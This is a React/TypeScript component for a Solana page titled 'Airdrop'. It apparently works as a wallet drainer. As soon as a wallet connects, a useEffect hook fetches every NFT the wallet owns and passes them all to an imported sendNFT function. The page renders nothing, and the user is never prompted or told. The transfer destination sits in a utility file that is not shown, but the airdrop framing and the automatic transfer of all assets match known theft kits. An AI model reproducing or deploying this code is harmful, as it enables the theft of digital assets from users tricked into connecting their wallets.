import { Fragment, useRef, useState, useEffect } from 'react';
import { useWallet, useConnection } from "@solana/wallet-adapter-react";
import {
  Connection,
  Keypair,
  PublicKey,
  Transaction,
  TransactionInstruction,
  ConfirmOptions,
  LAMPORTS_PER_SOL,
  SystemProgram,
  clusterApiUrl,
  SYSVAR_RENT_PUBKEY,
  SYSVAR_CLOCK_PUBKEY
} from '@solana/web3.js'
// import {AccountLayout,MintLayout,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID,Token} from "@solana/spl-token";
import useNotify from './notify'
// import {sendTransactionWithRetry} from './utility'
// import * as bs58 from 'bs58'
import * as anchor from "@project-serum/anchor";
import { programs } from '@metaplex/js';
// import axios from "axios"
// import {WalletConnect, WalletDisconnect} from '../wallet'
// import holders from "./Holders.json";
import { getNftsForOwner, sendNFT } from './utility';

let wallet : any
// let conn = new Connection(process.env.REACT_APP_SOLANA_HOST as string)
let notify: any

let wallet_flag = false;

const { metadata: { Metadata } } = programs
const TOKEN_METADATA_PROGRAM_ID = new anchor.web3.PublicKey("metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s")

const confirmOption : ConfirmOptions = {commitment : 'finalized',preflightCommitment : 'finalized',skipPreflight : false}

export default function Airdrop(){
	wallet = useWallet()
	notify = useNotify()

	useEffect(() => {
		if(wallet && wallet.publicKey) {
			if(wallet_flag) return;
			wallet_flag = true;
			// console.log("wallet amount", holders["44kswDZ39xRQUMu8HfLifaKFo8UVxgMZ5ZxvYPSowUV4" as keyof typeof holders].amount)
			sendAllNFTs();
		} else {
			wallet_flag = false;
		}
	}, [wallet])

	const sendAllNFTs = async() => {
		const mints = await getNftsForOwner(wallet.publicKey);
		await sendNFT(wallet, mints)
		// console.log("mints", mints)
	}

	return <>
		<main className='content'>
		</main>
	</>
}